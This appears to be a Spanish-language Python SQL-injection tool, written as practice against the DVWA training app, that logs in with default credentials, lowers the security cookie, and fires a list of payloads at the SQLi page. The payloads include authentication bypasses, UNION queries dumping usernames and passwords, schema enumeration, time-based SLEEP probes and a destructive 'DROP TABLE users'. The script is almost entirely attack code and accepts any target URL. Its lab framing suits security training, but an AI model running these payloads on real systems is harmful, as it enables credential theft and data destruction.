# 👹 DETECCION E INYECCION SQL                P4InyeccionSQL.py

````python
// Some code

```python
#! herramienta para practicar, deteccion e inyeccion SQL - P4InyeccionSQL.py - By P4IM0N

#?-----------------------------------------------------------------------------------------------------------------
#LIBRERIAS
import mechanize
from bs4 import BeautifulSoup
import time

#?-----------------------------------------------------------------------------------------------------------------
#COLORES
COLOR_VIOLETA = "\033[95m"
COLOR_VERDE = "\033[92m"
COLOR_ROJO = "\033[91m"
COLOR_AZUL = "\033[94m"
COLOR_AMARILLO = "\033[93m"
COLOR_TURQUESA = "\033[96m"
COLOR_RESET = "\033[0m"

#?-----------------------------------------------------------------------------------------------------------------
#BANNER
banner = f'''{COLOR_VIOLETA}

__________  _____ .___                                 .__                _________________  .____     
\______   \/  |  ||   | ____ ___.__. ____   ____  ____ |__| ____   ____  /   _____/\_____  \ |    |    
 |     ___/   |  ||   |/    <   |  |/ __ \_/ ___\/ ___\|  |/  _ \ /    \ \_____  \  /  / \  \|    |    
 {COLOR_RESET}{COLOR_AZUL}|    |  /    ^   /   |   |  \___  \  ___/\  \__\  \___|  (  <_> )   |  \/        \/   \_/.  \    |{COLOR_RESET}{COLOR_VIOLETA}___ 
 |____|  \____   ||___|___|  / ____|\___  >\___  >___  >__|\____/|___|  /_______  /\_____\ \_/_______ !
              |__|         \/\/         \/     \/    \/               \/        \/        \__>       \/
{COLOR_RESET}{COLOR_VERDE}By P4IM0N{COLOR_RESET}'''

print(banner)

#?-----------------------------------------------------------------------------------------------------------------
#LISTA INYECCIONES SQL 
payloadSQL = [
    "' OR '1'='1'; --",
    "' UNION SELECT null, username, password FROM users; --",
    "' OR 1=1; --",
    "' OR '1'='1'-- ",
    "' OR '1'='1' AND 'a'='b'; --",
    "'; DROP TABLE users; --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%pass%'); --",
    "' OR SLEEP(5); --",
    "' UNION SELECT null, TABLE_NAME, null FROM INFORMATION_SCHEMA.TABLES; --",
    "' UNION SELECT null, COLUMN_NAME, nulchanizel FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'; --"
]

#?-----------------------------------------------------------------------------------------------------------------
#FUNCION PRINCIPAL
def main():
    #?ingreso del objetivo
    objetivo = input(COLOR_AZUL+'Manito porfavor dame la URL del objetivo: '+COLOR_RESET)
    print(COLOR_AZUL+f'------------------------------------------{COLOR_TURQUESA}EMPECEMOS MANITO{COLOR_RESET}{COLOR_AZUL}----------------------------------------'+COLOR_RESET)
    
    #?configuracion de mechanize para usarlo
    navegador = mechanize.Browser()
    navegador.set_handle_robots(False)
    navegador.set_handle_equiv(False)
    navegador.set_handle_redirect(True)
    navegador.addheaders = [('User-Agent', 'Firefox')]
    navegador.open(objetivo)
    
    #?seleccionar formulario y mandar informacion
    navegador.select_form(nr=0)
    navegador['username'] = 'admin'
    navegador['password'] = 'password'
    navegador.submit()
    
    #?capturar la cookie de nuestro inicio de sesion
    cookies = navegador._ua_handlers['_cookies'].cookiejar
    #?cambiar el valor de seguridad de la cookie a 'low'
    for cookie in cookies:
        if cookie.name == 'security':
            cookie.value = 'low'
    #?agregamos ya la cookie modificada a la solicitud http
    navegador.set_cookiejar(cookies)
    print(COLOR_AZUL+f'-------------------------------------------{COLOR_TURQUESA}COOKIE MODIFICADA{COLOR_RESET}{COLOR_AZUL}--------------------------------------'+COLOR_RESET)
    print(cookies)      
    print(COLOR_AZUL+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
    
    #?cargando el objetivo numero 2, ya en la seccion de inyeccion SQL
    objetivo2 = objetivo.replace('/login.php', '/vulnerabilities/sqli/')
    print(COLOR_AZUL+f'-------------------------------------------{COLOR_TURQUESA}OBJETIVO A INYECTAR{COLOR_RESET}{COLOR_AZUL}------------------------------------'+COLOR_RESET)
    print(objetivo2)
    print(COLOR_AZUL+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
    navegador.open(objetivo2)
    
    #?seleccionamos formulario y mandamos inyeccion, en el objetivo final numero 2
    navegador.select_form(nr=0)
    navegador['id'] = "'"
    navegador.submit()
    
    #?usamos bs4 con beautifulsoup para explorar el HTML en buca de la respuesta positiva o negativa con respecto a la inyeccion
    objetivo_parseado = BeautifulSoup(navegador.response().read(), 'html5lib')
    print(COLOR_VIOLETA+f'-----------------------------------------{COLOR_TURQUESA}VULNERABLE A INYECCIONES SQL{COLOR_RESET}{COLOR_VIOLETA}-----------------------------'+COLOR_RESET)
    print(objetivo_parseado.find('pre'))
    print(COLOR_VIOLETA+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
    
    #?vamos a usar un loop for para iterar en toda nuesstra lista de solicitudes, consultas, payload de inyecciones SQL
    try:
        
        #?verificamos si se encontro vulnerable la pagina en primera instancia
        if objetivo_parseado.find('pre'):
            
            #?iteramos entre cada carga util àra inyectar e iniciamos en cada loop nuestra url objetivo2 para ver la respuesta tras la inyeccion de ese mopmento
            for inyecc in payloadSQL:
                time.sleep(1)
                navegador.open(objetivo2)
                navegador.select_form(nr=0)
                navegador['id'] = inyecc
                navegador.submit()
                objetivo_parseado_inyectandoce = BeautifulSoup(navegador.response().read(), 'html5lib')
                print(COLOR_AMARILLO+f'-------------------------------{COLOR_TURQUESA}INYECTAMOS{COLOR_RESET}{COLOR_AMARILLO}---------------------------------------------------------'+COLOR_RESET)
                print(COLOR_AMARILLO+inyecc+COLOR_RESET)
                print(COLOR_AMARILLO+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
                
                #?loop para extraer todas las etiquetas pre obtenidas con find_all una por una si hubiera
                resultado = objetivo_parseado_inyectandoce.find_all('pre')
                for pre in resultado:
                    print(COLOR_VIOLETA+f'-------------------------{COLOR_TURQUESA}INFORMACION TRAS LA INYECCION{COLOR_RESET}{COLOR_VIOLETA}--------------------------------------------'+COLOR_RESET)
                    print(COLOR_VIOLETA+pre.text+COLOR_RESET)
                    print(COLOR_VIOLETA+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
                    
        else:
            print(COLOR_ROJO+'------------------------------------------------NO VULNERABLE--------------------------------------------------'+COLOR_RESET)
            print(f'{COLOR_ROJO}Manito el sitio web parece no ser viulnerable a inyecciones SQL{COLOR_RESET}  {COLOR_VIOLETA}8({COLOR_RESET} ') 
            print(COLOR_ROJO+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)    
    
    except TypeError as error:
        print(COLOR_ROJO+'----------------------------------------------------ERROR----------------------------------------------'+COLOR_RESET)
        print(f'{COLOR_ROJO}Manito ocurrio un error de este tipo:{COLOR_RESET}{COLOR_VIOLETA}{error}{COLOR_RESET}')         
        print(COLOR_ROJO+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)               
                    
#?-----------------------------------------------------------------------------------------------------------------
#EJECUCION
if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(COLOR_AZUL+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
        print('gracias manito hasta aca llegamos, nos vecmos :D')
        print(COLOR_AZUL+'--------------------------------------------------------------------------------------------------'+COLOR_RESET)
        exit()    

#?-----------------------------------------------------------------------------------------------------------------
```
````
